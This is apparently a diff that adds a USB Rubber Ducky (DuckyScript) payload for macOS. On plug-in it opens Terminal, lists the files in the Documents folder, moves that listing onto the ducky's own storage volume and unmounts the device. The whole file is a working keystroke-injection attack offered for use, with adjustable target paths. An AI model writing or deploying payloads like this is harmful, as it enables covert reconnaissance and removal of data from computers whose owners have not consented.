@@ -1,0 +1,21 @@
+REM This is a script to get all the file names and information using the unix command ls -l and place it onto a txt file on the rubber ducky.
+REM This script is designated for MacOS computers 
+REM You can change the file path and rubber ducky path using the constants below
+  
+DEFINE FILE_PATH Documents
+DEFINE DUCKY_PATH /Volumes/CIRCUITPY
+
+  
+DELAY 10000
+COMMAND SPACE
+DELAY 450
+STRING terminal
+ENTER
+DELAY 450
+COMMAND N
+DELAY 250
+STRING cd FILE_PATH && ls -l > filenamesouput.txt && mv filenamesouput.txt DUCKY_PATH && diskutil unmount DUCKY_PATH
+DELAY 250
+ENTER
+
+
